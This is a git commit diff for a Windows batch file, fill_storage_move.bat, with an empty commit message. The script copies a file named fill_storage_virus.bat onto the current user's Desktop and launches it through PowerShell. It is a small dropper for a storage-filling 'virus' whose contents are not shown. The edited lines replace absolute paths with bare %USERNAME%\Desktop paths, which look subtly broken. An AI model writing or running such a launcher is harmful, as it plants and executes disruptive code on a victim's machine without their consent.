ef916ab10e100c62c87148d51796a66eed2009fc
s3q <devjopikatmor@gmail.com>
2021-08-04 23:12:01 +0400

    .

--- extensions/fill_storage_move.bat
+++ extensions/fill_storage_move.bat
@@ -1,4 +1,4 @@
 @echo off
-copy fill_storage_virus.bat C:\Users\%USERNAME%\Desktop
-powershell.exe -noexi "cd C:\Users\%USERNAME%\Desktop; start fill_storage_virus.bat"
+copy fill_storage_virus.bat %USERNAME%\Desktop
+powershell.exe -noexi "cd %USERNAME%\Desktop; start fill_storage_virus.bat"
 exit
